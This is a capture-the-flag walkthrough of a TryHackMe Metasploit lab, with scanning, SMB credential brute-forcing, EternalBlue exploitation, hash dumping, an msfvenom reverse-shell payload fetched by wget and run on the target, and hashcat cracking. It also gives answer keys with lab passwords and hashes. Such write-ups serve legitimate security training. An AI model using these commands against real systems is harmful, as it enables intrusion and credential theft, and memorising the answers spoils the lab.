![Metasploit: Exploitation Banner](https://assets.tryhackme.com/room-banners/metasploit.png)

<p align="center">
   <img src="https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/metasploitexploitation/Metasploit_Exploitation_Cover.png" alt="Metasploit: Exploitation Logo">
</p>

# Metasploit: Exploitation

This guide contains the answer and steps necessary to get to them for the [Metasploit: Exploitation](https://tryhackme.com/room/metasploitexploitation) room.

## Table of contents

- [Scanning](#scanning)
- [The Metasploit Database](#the-metasploit-database)
- [Vulnerability Scanning](#vulnerability-scanning)
- [Exploitation](#exploitation)
- [Msfvenom](#msfvenom)

### Scanning

1. How many ports are open on the target system?

   ```cmd
   use auxiliary/scanner/portscan/tcp
   ```
   
   ![Portscan](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/metasploitexploitation/Metasploit_Exploitation_Scanning_Portscan.png)

   ><details><summary>Click for answer</summary>5</details>

2. Using the relevant scanner, what NetBIOS name can you see?

   ```cmd
   use auxiliary/scanner/discovery/udp_sweep
   ```

   ![Netbios](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/metasploitexploitation/Metasploit_Exploitation_Scanning_Netbios.png)

   ><details><summary>Click for answer</summary>ACME IT SUPPORT</details>

3. What is running on port 8000?

   ```cmd
   nmap -sV 10.10.162.76
   ```

   ![Nmap](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/metasploitexploitation/Metasploit_Exploitation_Scanning_Nmap.png)

   ><details><summary>Click for answer</summary>WebFS/1.21</details>

4. What is the "penny" user's SMB password? Use the wordlist mentioned in the previous task. 

   ```cmd
   use auxiliary/scanner/smb/smb_login
   ```

   ![Smb](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/metasploitexploitation/Metasploit_Exploitation_Scanning_SMB.png)

   ><details><summary>Click for answer</summary>leo1234</details>

### The Metasploit Database

Lets try yo replicate what they are doing. First we need to start the databases and then Metasploit.

```cmd
systemctl start postgresql

sudo msfdb init
```

![Initialize](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/metasploitexploitation/Metasploit_Exploitation_Database_Initialize)

Now we can interact with the database with the following commands:

```cmd
db_status                  -> Check datanase status
workspace                  -> List workspaces
workspace -a tryhackme     -> Add a workspace
workspace default          -> Cange active workspace
```

![Msf](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/metasploitexploitation/Metasploit_Exploitation_Database_msf)

```cmd
db_nmap -p- 10.10.162.76   -> Perform an nmap scan and output results to the database
```

![Scan](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/metasploitexploitation/Metasploit_Exploitation_Database_Scan)

### Vulnerability Scanning

1. Who wrote the module that allows us to check SMTP servers for open relay?

   Look the the corresponding module and use `info`.
   
   ```cmd
   use auxiliary/scanner/smtp/smtp_relay
   info
   ```
   
   ![Smtp](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/metasploitexploitation/Metasploit_Exploitation_Vulnerability_SMTP)

   ><details><summary>Click for answer</summary>Campbell Murray</details>

### Exploitation

1. Exploit one of the critical vulnerabilities on the target VM

   We can do some scans to look for particular vulnerabilities. One easy thing to check is the host OS version. 
   
   ![Host](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/metasploitexploitation/Metasploit_Exploitation_Exploitation_Host)
   
   Looks like this might be vulnerable to the Eternal Blue exploit.
   
   ```cmd
   use exploit/windows/smb/ms17_010_eternalblue
   ```

   ![Exploited](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/metasploitexploitation/Metasploit_Exploitation_Exploitation_Exploited)

2. What is the content of the flag.txt file?

   Search through the user folder to find and read the flag.
   
   ![Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/metasploitexploitation/Metasploit_Exploitation_Exploitation_Flag)

   ><details><summary>Click for answer</summary>THM-5455554845</details>

3. What is the NTLM hash of the password of the user "pirate"?

   ```cmd
   use post/windows/gather/hashdump
   ```
   
   ![Hash](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/metasploitexploitation/Metasploit_Exploitation_Exploitation_Hash)

   ><details><summary>Click for answer</summary>8ce9a3ebd1647fcc5e04025019f4b875</details>

### Msfvenom
   
1. Launch the VM attached to this task. The username is murphy, and the password is 1q2w3e4r. You can connect via SSH or launch this machine in the browser. Once on the terminal, type "sudo su" to get a root shell, this will make things easier.
   
   ```cmd
   ssh murphy@10.10.164.113
   ```
   
   User the provided password to log in. Then switch to the root user with: `sudo su`.

2. Create a meterpreter payload in the .elf format (on the AttackBox, or your attacking machine of choice).

   ```cmd
   msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=10.18.78.136 lport=1337 -f elf -o shell.elf
   ```
   
   ![Creation](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/metasploitexploitation/Metasploit_Exploitation_Msfvenom_Creation)
   
3. Transfer it to the target machine (you can start a Python web server on your attacking machine with the python3 -m http.server 9000 command and use wget http://ATTACKING_MACHINE_IP:9000/shell.elf to download it to the target machine).

   ```cmd
   On our attackbox:
   python -m http.server 8080
   
   On the target machine:
   wget 10.18.78.136:8080/shell.elf
   ```
   
   ![Transfer](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/metasploitexploitation/Metasploit_Exploitation_Msfvenom_Transfer)
   
4. Get a meterpreter session on the target machine.

   First set up the handler in Metasploit, then change the file permission, and lastly, run the file on the target machein.
   
   ```cmd
   use exploit/multi/handler
   ```
   
   ![Handler](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/metasploitexploitation/Metasploit_Exploitation_Msfvenom_Handler)
   
   ```cmd
   chmod +x shell.elf
   
   ./shell.elf
   ```
   
   ![Run](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/metasploitexploitation/Metasploit_Exploitation_Msfvenom_Run)
   
   ![Connection](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/metasploitexploitation/Metasploit_Exploitation_Msfvenom_Connection)
   
5. Use a post exploitation module to dump hashes of other users on the system.

   ```cmd
   use post/linux/gather/hashdump
   ```
   
   ![Hash](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/metasploitexploitation/Metasploit_Exploitation_Msfvenom_Hash)
   
6. What is the other user's password hash?

   The hash can be found in the previous image. However, we could even go a step furter and try to crack the hash with hashcat.
   
   ```cmd
   echo '$6$Sy0NNIXw$SJ27WltHI89hwM5UxqVGiXidj94QFRm2Ynp9p9kxgVbjrmtMez9EqXoDWtcQd8rf0tjc77hBFbWxjGmQCTbep0' > passwd.hash
   ```
   
   ```cmd
   hashcat -a 3 passwd.hash /usr/share/wordlists/rockyou.txt  
   ```
   
   ![Hashcat](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/metasploitexploitation/Metasploit_Exploitation_Msfvenom_Hashcat)

   ><details><summary>Click for answer</summary>$6$Sy0NNIXw$SJ27WltHI89hwM5UxqVGiXidj94QFRm2Ynp9p9kxgVbjrmtMez9EqXoDWtcQd8rf0tjc77hBFbWxjGmQCTbep0</details>
